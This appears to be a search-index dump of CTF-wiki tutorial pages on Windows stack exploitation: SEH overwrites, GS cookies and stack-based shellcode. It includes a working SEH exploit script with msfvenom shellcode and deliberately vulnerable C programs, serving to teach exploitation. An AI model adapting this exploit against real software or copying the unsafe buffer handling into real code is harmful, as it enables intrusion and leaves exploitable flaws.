\u673a\u5236\uff0c\u7528\u4e8e\u4e00\u81f4\u5730\u5904\u7406\u786c\u4ef6\u548c\u8f6f\u4ef6\u5f02\u5e38\u3002\u8be5\u7ed3\u6784\u901a\u5e38\u8868\u793a\u4e3a try / except\u6216try / catch \u4ee3\u7801\u5757\u3002 __try { // the block of code to try (aka the \"guarded body\") ... } __except ( exception filter ) { // the code to run in the event of an exception (aka the \"exception handler) ... } \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u53ef\u4ee5\u7531\u5e94\u7528\u7a0b\u5e8f\uff08\u901a\u8fc7\u4e0a\u8ff0 try / except \u6784\u9020\uff09\u6216\u7531\u64cd\u4f5c\u7cfb\u7edf\u672c\u8eab\u5b9e\u73b0\u3002\u7531\u4e8e\u9519\u8bef\u7684\u7c7b\u578b\u5f88\u591a\uff08\u9664\u96f6\uff0c\u8d85\u51fa\u8303\u56f4\u7b49\uff09\uff0c\u56e0\u6b64\u53ef\u4ee5\u6709\u8bb8\u591a\u76f8\u5e94\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u4e0d\u8bba\u5728\u4f55\u5904\u5b9a\u4e49\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u5e94\u7528\u7a0b\u5e8f\u4e0e\u64cd\u4f5c\u7cfb\u7edf\uff09\uff0c\u8fd8\u662f\u8bbe\u8ba1\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u7c7b\u578b\uff0c\u6240\u6709\u5904\u7406\u7a0b\u5e8f\u5747\u7531 Windows SEH \u901a\u8fc7\u6307\u5b9a\u6570\u636e\u7ed3\u6784\u548c\u51fd\u6570\u7684\u96c6\u5408\u8fdb\u884c\u96c6\u4e2d\u7edf\u4e00\u7ba1\u7406\u3002","title":"Instruction"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#seh","text":"\u5bf9\u4e8e\u6bcf\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u90fd\u6709\u4e00\u4e2a Exception Registration Record \u7ed3\u6784\uff0c\u5982\u4e0b\u6240\u793a\uff1a typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD * Next ; PEXCEPTION_ROUTINE Handler ; } EXCEPTION_REGISTRATION_RECORD , * PEXCEPTION_REGISTRATION_RECORD ; \u8fd9\u4e9b Exception Registration Record \u4f7f\u7528\u94fe\u8868\u7684\u7ed3\u6784\u8fde\u63a5\u5728\u4e00\u8d77 \u3002\u5176\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5\uff08 Next\uff09\u662f\u6307\u5411SEH\u94fe\u4e2d\u4e0b\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u53ef\u4ee5\u4f7f\u7528 Next \u4ece\u4e0a\u5230\u4e0b\u6d4f\u89c8 SEH \u94fe\u3002\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\uff08Handler\uff09\u662f\u6307\u5411\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7684\u6307\u9488\uff0c\u8be5\u51fd\u6570\u5982\u4e0b\u6240\u793a\uff1a EXCEPTION_DISPOSITION __cdecl _except_handler ( struct _EXCEPTION_RECORD * ExceptionRecord , oid EstablisherFrame , struct _CONTEXT * ContextRecord , void * DispatcherContext ); \u7b2c\u4e00\u4e2a\u51fd\u6570\u53c2\u6570\u662f\u6307\u5411 _EXCEPTION_RECORD \u7ed3\u6784\u7684\u6307\u9488\u3002\u8be5\u7ed3\u6784\u5305\u542b\u6709\u5173\u7ed9\u5b9a\u5f02\u5e38\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5f02\u5e38\u4ee3\u7801\uff0c\u5f02\u5e38\u5730\u5740\u548c\u53c2\u6570\u6570\u91cf\u3002 _except_handler \u51fd\u6570\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4ee5\u786e\u5b9a\u5f02\u5e38\u662f\u5426\u53ef\u4ee5\u7531\u5f53\u524d\u5f02\u5e38\u5904\u7406\u51fd\u6570\u5904\u7406\uff0c\u6216\u8005\u5b83\u9700\u8981\u79fb\u4ea4\u5230\u4e0b\u4e00\u4e2a Exception Registration Record \u8fdb\u884c\u5904\u7406\u3002","title":"SEH\u7684\u4e3b\u8981\u7ec4\u6210\u90e8\u5206"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#seh_1","text":"\u5728 SEH \u4e0b\uff0c\u76f4\u63a5\u8986\u76d6 SEH_Handler \u5b57\u6bb5\uff0c\u7136\u540e\u89e6\u53d1\u5f02\u5e38\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u6d4b\u8bd5\u7a0b\u5e8f\u4ee3\u7801\uff08\u4f7f\u7528VS2017\u547d\u4ee4\u884c\u7f16\u8bd1\uff09\uff1a // cl SEH_Chain.c /GS- /DYNAMICBASE:NO /link /FIXED int vul () { char s [ 0x20 ] = { 0 }; __try { scanf ( \"%s\" , s ); } __except ( EXCEPTION_EXECUTE_HANDLER ) { puts ( \"GG\" ); } return 0 ; } int main ( int argc , char ** argv ) { puts ( \"Welcome!\" ); vul (); return 0 ; } \u672a\u4fee\u6539\u7684SEH\u94fe\uff1a \u5730\u5740 \u5f02\u5e38\u5904\u7406\u4f8b\u7a0b \u6a21\u5757/\u6807\u7b7e \u6ce8\u91ca 0019FF60 00401E10 seh_chain 0019FFCC 77A79F80 ntdll 0019FFE4 77A88F07 ntdll \u6808\u7a7a\u95f4\uff1a 0019FF60 0019FFCC \u6307\u5411SEH_Record[1]\u7684\u6307\u9488 0019FF64 00401E10 seh_chain.00401E10 0019FF68 E1C62A0A 0019FF6C 00000000 0019FF70 0019FF80 0019FF74 76036359 \u8fd4\u56de\u5230 kernel32.76036359 \u81ea ??? 0019FF78 00379000 0019FF7C 76036340 kernel32.76036340 0019FF80 0019FFDC 0019FF84 77A67B74 \u8fd4\u56de\u5230 ntdll.77A67B74 \u81ea ??? 0019FF88 00379000 0019FF8C E03A396D 0019FF90 00000000 0019FF94 00000000 0019FF98 00379000 0019FF9C 00000000 0019FFA0 00000000 0019FFA4 00000000 0019FFA8 00000000 0019FFAC 00000000 0019FFB0 00000000 0019FFB4 00000000 0019FFB8 00000000 0019FFBC 00000000 0019FFC0 00000000 0019FFC4 0019FF8C 0019FFC8 00000000 0019FFCC 0019FFE4 \u6307\u5411SEH_Record[2]\u7684\u6307\u9488 0019FFD0 77A79F80 ntdll.77A79F80 \u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230SEH\u94fe\u7684\u5b58\u5728\u3002scanf\u8986\u76d6\u4e4b\u540e\u7684SEH\u94fe\uff1a \u5730\u5740 \u5f02\u5e38\u5904\u7406\u4f8b\u7a0b \u6a21\u5757/\u6807\u7b7e \u6ce8\u91ca 0019FF10 42424242 42424242 00000000 \u5904\u7406\u4f8b\u7a0b\u548c\u4e0b\u4e2aSEH\u7ed3\u6784\u7684\u4f4d\u7f6e\u90fd\u5df2\u7ecf\u88ab\u4fee\u6539\u3002\u5c1d\u8bd5\u8f93\u5165\u5927\u91cf\u6570\u636e\u4ee5\u89e6\u53d1\u5f02\u5e38\uff1a python - c \"print 'A'*0x28 + 'B'*8 + 'A'*0x200\" \u89e6\u53d1\u5f02\u5e38\u540e\u7684\u5bc4\u5b58\u5668\uff1a EAX : 00000000 EBX : 00000000 ECX : 42424242 EDX : 77A88DC0 ntdll.77A88DC0 EBP : 0019F0D8 ESP : 0019F0B8 ESI : 00000000 EDI : 00000000 EIP : 42424242 EFLAGS : 00010246 \u53ef\u4ee5\u770b\u5230\uff0cEIP\u5df2\u7ecf\u88ab\u63a7\u5236\u5230\u4e86\u8f93\u5165\u7684 BBBB(42424242) \u5904\uff0c\u4ece\u800c\u63a7\u5236\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002","title":"\u5229\u7528SEH"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#seh_2","text":"attachment here EIP\u88ab\u63a7\u5236\u540e\u7684\u6808\u7a7a\u95f4\uff1a 0019F0B8 77A88DA2 \u8fd4\u56de\u5230 ntdll.77A88DA2 \u81ea ??? 0019F0BC 0019F1B8 0019F0C0 0019FF10 \"BBBBBBBBAAAAAAAAAAAAAAAAA... \" 0019F0C4 0019F208 0019F0C8 0019F144 &\"BBBBBBBBAAAAAAAAAAAAAAAA... \" 0019F0CC 0019F6FC \u6307\u5411SEH_Record[1]\u7684\u6307\u9488 0019F0D0 77A88DC0 ntdll.77A88DC0 0019F0D4 0019FF10 \"BBBBBBBBAAAAAAAAAAAAAAAAA...\" 0019F0D8 0019F1A0 \u53ef\u4ee5\u770b\u5230 ESP+0x8 \u5904\u7684\u5730\u5740\u6b63\u597d\u6307\u5411\u89e6\u53d1\u5f02\u5e38\u7684 SEH \u7684\u7ed3\u6784\u5904\uff0c\u5f53\u7a0b\u5e8f\u672a\u5f00\u542f DEP \u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 POP+POP+RET \u7684\u65b9\u5f0f\uff0c\u6267\u884c\u5230 ShellCode \u4e0a\u3002\u5bfb\u627e\u4e00\u4e2a gadget\uff1a\uff08x32dbg ->\u53f3\u51fb->\u641c\u7d22->\u6240\u6709\u6a21\u5757->\u547d\u4ee4\uff0c\u6216\u8005\u5176\u4ed6\u65b9\u6cd5\u5bfb\u627e\uff09 0040292 A | 5 E | pop esi | 0040292 B | 5 B | pop ebx | 0040292 C | C3 | ret | \u7f16\u5199\u4e00\u4e2aEXP\uff1a from pwintools import * import struct def p32 ( addr ): return struct . pack ( \"<I\" , addr ) pop_pop_ret = 0x0040136F p = Process ( \"./SEH_Chain_VC6.exe\" ) # msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\\x09\\x0a\\x0b\\x0c\\x0d\\x1a\\x20' -f python buf = \"\" buf += \" \\xb8\\xb6\\xc7\\xe5\\xf9\\xda\\xdb\\xd9\\x74\\x24\\xf4\\x5d\\x29 \" buf += \" \\xc9\\xb1\\x31\\x83\\xed\\xfc\\x31\\x45\\x0f\\x03\\x45\\xb9\\x25 \" buf += \" \\x10\\x05\\x2d\\x2b\\xdb\\xf6\\xad\\x4c\\x55\\x13\\x9c\\x4c\\x01 \" buf += \" \\x57\\x8e\\x7c\\x41\\x35\\x22\\xf6\\x07\\xae\\xb1\\x7a\\x80\\xc1 \" buf += \" \\x72\\x30\\xf6\\xec\\x83\\x69\\xca\\x6f\\x07\\x70\\x1f\\x50\\x36 \" buf += \" \\xbb\\x52\\x91\\x7f\\xa6\\x9f\\xc3\\x28\\xac\\x32\\xf4\\x5d\\xf8 \" buf += \" \\x8e\\x7f\\x2d\\xec\\x96\\x9c\\xe5\\x0f\\xb6\\x32\\x7e\\x56\\x18 \" buf += \" \\xb4\\x53\\xe2\\x11\\xae\\xb0\\xcf\\xe8\\x45\\x02\\xbb\\xea\\x8f \" buf += \" \\x5b\\x44\\x40\\xee\\x54\\xb7\\x98\\x36\\x52\\x28\\xef\\x4e\\xa1 \" buf += \" \\xd5\\xe8\\x94\\xd8\\x01\\x7c\\x0f\\x7a\\xc1\\x26\\xeb\\x7b\\x06 \" buf += \" \\xb0\\x78\\x77\\xe3\\xb6\\x27\\x9b\\xf2\\x1b\\x5c\\xa7\\x7f\\x9a \" buf += \" \\xb3\\x2e\\x3b\\xb9\\x17\\x6b\\x9f\\xa0\\x0e\\xd1\\x4e\\xdc\\x51 \" buf += \" \\xba\\x2f\\x78\\x19\\x56\\x3b\\xf1\\x40\\x3c\\xba\\x87\\xfe\\x72 \" buf += \" \\xbc\\x97\\x00\\x22\\xd5\\xa6\\x8b\\xad\\xa2\\x36\\x5e\\x8a\\x5d \" buf += \" \\x7d\\xc3\\xba\\xf5\\xd8\\x91\\xff\\x9b\\xda\\x4f\\xc3\\xa5\\x58 \" buf += \" \\x7a\\xbb\\x51\\x40\\x0f\\xbe\\x1e\\xc6\\xe3\\xb2\\x0f\\xa3\\x03 \" buf += \" \\x61\\x2f\\xe6\\x67\\xe4\\xa3\\x6a\\x46\\x83\\x43\\x08\\x96 \" payload = \"\" payload += \" \\x90 \" * 0x28 payload += \" \\xEB\\x14\\x90\\x90 \" # asm(\"jmp $+22\") payload += p32 ( pop_pop_ret ) payload += \" \\x90 \" * 0x20 payload += buf payload = payload . ljust ( 0x200 , \" \\x90 \" ) raw_input () p . sendline ( payload ) raw_input () \u6267\u884cexp\u540e\uff0c\u5c06\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8ba1\u7b97\u5668\u3002","title":"SEH\u7684\u5e38\u7528\u5229\u7528\u65b9\u5f0f"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/","text":"Execute Shellcode \u00b6 Introduction \u00b6 A shellcode is a piece of code that is executed to exploit a software vulnerability. The shellcode is a hexadecimal mechanical code, named after the attacker often gets the shell. Shellcode is often written in machine language. After the scratchpad eip overflows, it inserts a shellcode mechanical code that the CPU can execute, allowing the computer to execute any command from the attacker. The ASLR, NX, and CANARY options are turned off at compile time, so that the shellcode can be placed on the stack at the time of input. The dynamic padding can be used to obtain the required padding overflow to the shellcode address of the input address, so that the shellcode will be executed after the program returns. . example \u00b6 A classic example is given below. After the program overflows, the shellcode is executed. The compiled environment is vc6.0 for the winxp tool. #include <stdio.h> #include <windows.h> #define PASSWORD \"1234567\" int verify_password ( char * password ) { int authenticated ; char buffer [ 50 ]; authenticated = strcmp ( password , PASSWORD ); memcpy ( buffer , password , strlen ( password )); return authenticated ; } void main () { int valid_flag = 0 ; char password [ 1024 ]; FILE * fp ; LoadLibrary ( \"user32.dll\" ); if ( ! ( fp = fopen ( \"password.txt\" , \"rw+\" ))) { exit ( 0 ); } fscanf ( fp , \"%s\" , password ); valid_flag = verify_password ( password ); if ( valid_flag != 0 ) { printf ( \"incorrect password! \\n\\n \" ); } else { printf ( \"Congratulation! You have passed the verification! \\n \" ); } fclose ( fp ); getchar (); } After compiling, drag into OllyDbg dynamic debugging to determine the length of padding , and the next breakpoint at memcpy for subsequent debugging. You can make a 50 BYTES padding comparison distance from the return address, and finally determine the return address after 60 BYTES. The entered string will be copied to the location of the 0012FAE4 on the stack. Because the return address is controlled to 0012FAE4 by reasonable padding, the value of the register EIP is 0012FAE4 when the function returns. At this time, the system considers the data in the stack as machine code, the program. The code with the address 0012FAE4 will be executed. The content in password.txt is a well-arranged machine code. The function is to pop up a message box with hackhack . How to write the contents of password.txt , we will focus on the entire implementation process in the following chapters. As expected, the pop-up function was performed after the program returned. Reference reading \u00b6 [0day security: software vulnerability analysis technology] () cve-2015-8277","title":"shellcode-in-stack"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#execute-shellcode","text":"","title":"Execute Shellcode"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#introduction","text":"A shellcode is a piece of code that is executed to exploit a software vulnerability. The shellcode is a hexadecimal mechanical code, named after the attacker often gets the shell. Shellcode is often written in machine language. After the scratchpad eip overflows, it inserts a shellcode mechanical code that the CPU can execute, allowing the computer to execute any command from the attacker. The ASLR, NX, and CANARY options are turned off at compile time, so that the shellcode can be placed on the stack at the time of input. The dynamic padding can be used to obtain the required padding overflow to the shellcode address of the input address, so that the shellcode will be executed after the program returns. .","title":"Introduction"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#example","text":"A classic example is given below. After the program overflows, the shellcode is executed. The compiled environment is vc6.0 for the winxp tool. #include <stdio.h> #include <windows.h> #define PASSWORD \"1234567\" int verify_password ( char * password ) { int authenticated ; char buffer [ 50 ]; authenticated = strcmp ( password , PASSWORD ); memcpy ( buffer , password , strlen ( password )); return authenticated ; } void main () { int valid_flag = 0 ; char password [ 1024 ]; FILE * fp ; LoadLibrary ( \"user32.dll\" ); if ( ! ( fp = fopen ( \"password.txt\" , \"rw+\" ))) { exit ( 0 ); } fscanf ( fp , \"%s\" , password ); valid_flag = verify_password ( password ); if ( valid_flag != 0 ) { printf ( \"incorrect password! \\n\\n \" ); } else { printf ( \"Congratulation! You have passed the verification! \\n \" ); } fclose ( fp ); getchar (); } After compiling, drag into OllyDbg dynamic debugging to determine the length of padding , and the next breakpoint at memcpy for subsequent debugging. You can make a 50 BYTES padding comparison distance from the return address, and finally determine the return address after 60 BYTES. The entered string will be copied to the location of the 0012FAE4 on the stack. Because the return address is controlled to 0012FAE4 by reasonable padding, the value of the register EIP is 0012FAE4 when the function returns. At this time, the system considers the data in the stack as machine code, the program. The code with the address 0012FAE4 will be executed. The content in password.txt is a well-arranged machine code. The function is to pop up a message box with hackhack . How to write the contents of password.txt , we will focus on the entire implementation process in the following chapters. As expected, the pop-up function was performed after the program returned.","title":"example"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#reference-reading","text":"[0day security: software vulnerability analysis technology] () cve-2015-8277","title":"Reference reading"},{"location":"pwn/windows/stackoverflow/stack-introduce/","text":"\u6808\u4ecb\u7ecd \u00b6 \u00b6 [You can refer to this article] ( https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/ )","title":"Stack Introduction"},{"location":"pwn/windows/stackoverflow/stack-introduce/#_1","text":"[You can refer to this article] ( https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/ )","title":"\u6808\u4ecb\u7ecd \u00b6"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/","text":"Introduction \u00b6 \u6b63\u5982Linux\u4e2d\u5b58\u5728\u6808\u6ea2\u51fa\u7684\u9632\u62a4\u673a\u5236 Canary \u4e00\u6837\uff0cwindows \u4e2d\u4e5f\u5b58\u5728\u7c7b\u4f3c\u7684\u673a\u5236\u3002\u4e0e Canary \u7684\u601d\u60f3\u4e00\u81f4\uff0cGS \u4e5f\u662f\u5728\u6808\u4e2d\u63d2\u5165\u4e00\u4e2a\u503c\uff0c\u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4b GS \u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8\uff0c\u4ee5\u6b64\u6765\u5224\u65ad stack/buffer overflow \u662f\u5426\u53d1\u751f\u3002 GS \u539f\u7406 \u00b6 \u4f7f\u7528Visual Studio\u7f16\u8bd1\u65f6\uff0c\u3001GS\u9ed8\u8ba4\u4e3a\u6253\u5f00\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u5728\u6253\u5f00\u9879\u76ee\u7684\u201d\u5c5e\u6027\u9875\u201c\u4e2d\u4fee\u6539\u3002 \u5728/ GS\u7f16\u8bd1\u5668\u9009\u9879\u4fdd\u62a4\u4e0b\u5217\u9879\u76ee\uff1a \u00b6 \u51fd\u6570\u8c03\u7528\u7684\u8fd4\u56de\u5730\u5740\u3002 \u51fd\u6570\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u5730\u5740\u3002 \u8106\u5f31\u7684\u529f\u80fd\u53c2\u6570\u3002 GS \u5b9e\u73b0\u539f\u7406 \u00b6 \u5f00\u542f GS \u4fdd\u62a4\u7684 stack \u7ed3\u6784\u5927\u6982\u5982\u4e0b\uff1a Low Address | Local Variable | +-----------------+ rbp-8 => | GS_Cookie | +-----------------+ rbp => | old ebp | +-----------------+ | return address | +-----------------+ | args | +-----------------+ High | | Address \u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86 GS \u4fdd\u62a4\u65f6\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u5c06 security cookie \u4e0e ebp \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u7136\u540e\u5b58\u653e\u5728 ebp-0x1C \u7684\u4f4d\u7f6e mov eax , ___security_cookie xor eax , ebp mov [ ebp - 0x1C ], eax \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u548c ebp \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\u540e\uff0c\u4e0e _security_cookie \u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u3002 mov ecx , [ ebp + var_1C ] xor ecx , ebp call j_@__security_check_cookie@4 ; __security_check_cookie(x) ------------------------------------------------------------------ ; __fastcall __security_check_cookie(x) @ __security_check_cookie@4 proc near cmp ecx , ___security_cookie bnd jnz short loc_4086E5 bnd retn loc_4086E5: bnd jmp sub_4010B9 \u5982\u679c GS_Cookie \u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230\u629b\u51fa\u5f02\u5e38\u5e76\u9000\u51fa\u7684\u6d41\u7a0b\u3002 push offset ExceptionInfo ; ExceptionInfo call sub_401A87 \u5176\u4e2d ___security_cookie \u662f\u5b58\u653e\u5728 .data \u6bb5\u4e0a\u7684\u6570\u636e\uff0c .data:0047C004 ___security_cookie dd 0BB40E64Eh \u5176\u6bcf\u6b21\u8fd0\u884c\u90fd\u4f1a\u91cd\u65b0\u8d4b\u503c\u4e3a\u65b0\u7684\u503c void sub_409366 () { int v0 ; // ecx unsigned int v1 ; // eax v0 = __security_cookie ; if ( __security_cookie == 0xBB40E64E || ! ( __security_cookie & 0xFFFF0000 ) ) { v1 = sub_409306 (); v0 = v1 ; if ( v1 == 0xBB40E64E ) { v0 = 0xBB40E64F ; } else if ( ! ( v1 & 0xFFFF0000 ) ) { v0 = (( v1 | 0x4711 ) << 16 ) | v1 ; } __security_cookie = v0 ; } dword_47C000 = ~ v0 ; } unsigned int sub_409306 () { LARGE_INTEGER PerformanceCount ; // [esp+0h] [ebp-14h] struct _FILETIME SystemTimeAsFileTime ; // [esp+8h] [ebp-Ch] DWORD v3 ; // [esp+10h] [ebp-4h] SystemTimeAsFileTime . dwLowDateTime = 0 ; SystemTimeAsFileTime . dwHighDateTime = 0 ; GetSystemTimeAsFileTime ( & SystemTimeAsFileTime ); v3 = SystemTimeAsFileTime . dwLowDateTime ^ SystemTimeAsFileTime . dwHighDateTime ; v3 ^= GetCurrentThreadId (); v3 ^= GetCurrentProcessId (); QueryPerformanceCounter ( & PerformanceCount ); return ( unsigned int ) & v3 ^ v3 ^ PerformanceCount . LowPart ^ PerformanceCount . HighPart ; } \u4f46\u662f\u7531\u4e8e\u5176\u5b58\u50a8\u5728\u7a0b\u5e8f\u6bb5\u4e0a\uff0c\u6240\u4ee5\u6bd4\u8d77 Canary \u66f4\u5bb9\u6613\u8bfb\u53d6\u5229\u7528\u3002","title":"stackoverflow GS"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#introduction","text":"\u6b63\u5982Linux\u4e2d\u5b58\u5728\u6808\u6ea2\u51fa\u7684\u9632\u62a4\u673a\u5236 Canary \u4e00\u6837\uff0cwindows \u4e2d\u4e5f\u5b58\u5728\u7c7b\u4f3c\u7684\u673a\u5236\u3002\u4e0e Canary \u7684\u601d\u60f3\u4e00\u81f4\uff0cGS \u4e5f\u662f\u5728\u6808\u4e2d\u63d2\u5165\u4e00\u4e2a\u503c\uff0c\u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4b GS \u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8\uff0c\u4ee5\u6b64\u6765\u5224\u65ad stack/buffer overflow \u662f\u5426\u53d1\u751f\u3002","title":"Introduction"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#gs","text":"\u4f7f\u7528Visual Studio\u7f16\u8bd1\u65f6\uff0c\u3001GS\u9ed8\u8ba4\u4e3a\u6253\u5f00\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u5728\u6253\u5f00\u9879\u76ee\u7684\u201d\u5c5e\u6027\u9875\u201c\u4e2d\u4fee\u6539\u3002","title":"GS \u539f\u7406"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#gs_1","text":"\u51fd\u6570\u8c03\u7528\u7684\u8fd4\u56de\u5730\u5740\u3002 \u51fd\u6570\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u5730\u5740\u3002 \u8106\u5f31\u7684\u529f\u80fd\u53c2\u6570\u3002","title":"\u5728/ GS\u7f16\u8bd1\u5668\u9009\u9879\u4fdd\u62a4\u4e0b\u5217\u9879\u76ee\uff1a"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#gs_2","text":"\u5f00\u542f GS \u4fdd\u62a4\u7684 stack \u7ed3\u6784\u5927\u6982\u5982\u4e0b\uff1a Low Address | Local Variable | +-----------------+ rbp-8 => | GS_Cookie | +-----------------+ rbp => | old ebp | +-----------------+ | return address | +-----------------+ | args | +-----------------+ High | | Address \u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86 GS \u4fdd\u62a4\u65f6\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u5c06 security cookie \u4e0e ebp \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u7136\u540e\u5b58\u653e\u5728 ebp-0x1C \u7684\u4f4d\u7f6e mov eax , ___security_cookie xor eax , ebp mov [ ebp - 0x1C ], eax \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u548c ebp \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\u540e\uff0c\u4e0e _security_cookie \u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u3002 mov ecx , [ ebp + var_1C ] xor ecx , ebp call j_@__security_check_cookie@4 ; __security_check_cookie(x) ------------------------------------------------------------------ ; __fastcall __security_check_cookie(x) @ __security_check_cookie@4 proc near cmp ecx , ___security_cookie bnd jnz short loc_4086E5 bnd retn loc_4086E5: bnd jmp sub_4010B9 \u5982\u679c GS_Cookie \u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230\u629b\u51fa\u5f02\u5e38\u5e76\u9000\u51fa\u7684\u6d41\u7a0b\u3002 push offset ExceptionInfo ; ExceptionInfo call sub_401A87 \u5176\u4e2d ___security_cookie \u662f\u5b58\u653e\u5728 .data \u6bb5\u4e0a\u7684\u6570\u636e\uff0c .data:0047C004 ___security_cookie dd 0BB40E64Eh \u5176\u6bcf\u6b21\u8fd0\u884c\u90fd\u4f1a\u91cd\u65b0\u8d4b\u503c\u4e3a\u65b0\u7684\u503c void sub_409366 () { int v0 ; // ecx unsigned int v1 ; // eax v0 = __security_cookie ; if ( __security_cookie == 0xBB40E64E || ! ( __security_cookie & 0xFFFF0000 ) ) { v1 = sub_409306 (); v0 = v1 ; if ( v1 == 0xBB40E64E ) { v0 = 0xBB40E64F ; } else if ( ! ( v1 & 0xFFFF0000 ) ) { v0 = (( v1 | 0x4711 ) << 16 ) | v1 ; } __security_cookie = v0 ; } dword_47C000 = ~ v0 ; } unsigned int sub_409306 () { LARGE_INTEGER PerformanceCount ; // [esp+0h] [ebp-14h] struct _FILETIME SystemTimeAsFileTime ; // [esp+8h] [ebp-Ch] DWORD v3 ; // [esp+10h] [ebp-4h] SystemTimeAsFileTime . dwLowDateTime = 0 ; SystemTimeAsFileTime . dwHighDateTime = 0 ; GetSystemTimeAsFileTime ( & SystemTimeAsFileTime ); v3 = SystemTimeAsFileTime . dwLowDateTime ^ SystemTimeAsFileTime . dwHighDateTime ; v3 ^= GetCurrentThreadId (); v3 ^= GetCurrentProcessId (); QueryPerformanceCounter ( & PerformanceCount ); return ( unsigned int ) & v3 ^ v3 ^ PerformanceCount . LowPart ^ PerformanceCount . HighPart ; } \u4f46\u662f\u7531\u4e8e\u5176\u5b58\u50a8\u5728\u7a0b\u5e8f\u6bb5\u4e0a\uff0c\u6240\u4ee5\u6bd4\u8d77 Canary \u66f4\u5bb9\u6613\u8bfb\u53d6\u5229\u7528\u3002","title":"GS \u5b9e\u73b0\u539f\u7406"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/","text":"Stack overflow principle \u00b6 Introduction \u00b6 For an introduction to the stack, read the introduction in [Linux Pwn] ( https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/ ). Basic example \u00b6 A typical example is given below, in which the last byte overflow occurs due to the order of the variable declarations and the size of the buffer declaration. #include <stdio.h> #define PASSWORD \"666666\" int verify_password ( char * password ) { int authenticated ; char buffer [ 8 ]; authenticated = strcmp ( password , PASSWORD ); strcpy ( buffer , password ); return authenticated ; } void main () { int valid_flag = 0 ; char password [ 128 ]; while ( 1 ) { printf ( \"please input password: \" ); scanf ( \"%s\" , password ); valid_flag = verify_password ( password ); if ( valid_flag != 0 ) { printf ( \"incorrect password! \\n \" ); } else { printf ( \"Congratulation! You have passed the verification! \\n \" ); break ; } } } This is a simple password verification program that will determine if the input string is equal to 666666. Use vc6.0 to compile this program. After successful, use winchecksec to view the protection that was opened. It can be seen that GS is turned on, but this does not hinder our overflow. C:\\Users\\CarlStar\\Desktop>winchecksec.exe demo1.exe Dynamic Base : false ASLR : true High Entropy VA : false Force Integrity : false Isolation : true NX : true SEH: true CFG : false RFG : false SafeSEH : true GS : true Authenticode : false .NET : true Use OllyDbg to dynamically debug this program, enter aaaaaa and see the normal execution flow of the program. To make it easier to understand the whole process, the next breakpoint is executed after the strcmp function and strcpy are executed. Now let the program run, after entering aaaaaa, the program will execute to the first breakpoint under us. Go to the strcmp function and observe its return value. Because the ascii code value of a is greater than the ascii code value of 6, no unexpected function will return 1 , the return value under x86 is saved in the EAX register, after the function returns 